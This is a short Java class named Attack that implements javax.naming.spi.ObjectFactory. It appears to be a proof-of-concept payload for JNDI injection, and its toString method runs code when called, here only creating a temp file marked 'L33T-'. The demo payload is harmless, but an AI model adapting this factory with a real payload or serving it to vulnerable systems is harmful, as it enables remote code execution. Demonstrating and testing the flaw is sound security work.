
public class Attack implements javax.naming.spi.ObjectFactory
{
	@Override
	public Object getObjectInstance(Object obj,
									javax.naming.Name name,
									javax.naming.Context context,
									java.util.Hashtable env) {

		return(new Attack());
	}

	@Override
	public String toString() {
		
		try { java.nio.file.Files.createTempFile("L33T-","-shutdownhook"); }
		catch (Exception e) { System.out.println("WTF: " + e.toString()); }
		
		return("nothing to see here");
	}
}
